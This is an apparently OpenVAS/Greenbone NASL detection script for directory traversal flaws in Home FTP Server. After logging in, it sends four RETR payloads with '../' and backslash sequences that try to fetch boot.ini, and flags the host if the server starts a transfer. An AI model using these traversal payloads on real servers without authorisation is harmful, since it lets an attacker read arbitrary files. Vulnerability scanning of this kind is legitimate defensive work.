if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902270" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_bugtraq_id( 44543 );
	script_name( "Home FTP Server Multiple Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15349/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "Host/runs_windows", "ftp/home_ftp/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary
  files on the affected application." );
	script_tag( name: "affected", value: "Home FTP Server version 1.10.3 build 144 and 1.11.1 build 149." );
	script_tag( name: "insight", value: "The flaw is due to an error while handling certain requests
  which can be exploited to download arbitrary files from the host system." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Home Ftp Server and is prone to directory
  traversal vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "Home Ftp Server" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc1, user: user, pass: pass );
if(login_details){
	exploits = make_list( "RETR  /..\\/..\\/..\\/..\\boot.ini",
		 "RETR ..//..//..//..//boot.ini",
		 "RETR \\\\\\..\\..\\..\\..\\..\\..\\boot.ini",
		 "RETR ../../../../../../../../../../../../../boot.ini" );
	result = ftp_send_cmd( socket: soc1, cmd: "PASV" );
	for exp in exploits {
		result = ftp_send_cmd( socket: soc1, cmd: exp );
		if(ContainsString( result, "150 Opening data connection" )){
			security_message( ftpPort );
			exit( 0 );
		}
	}
	ftp_close( socket: soc1 );
}

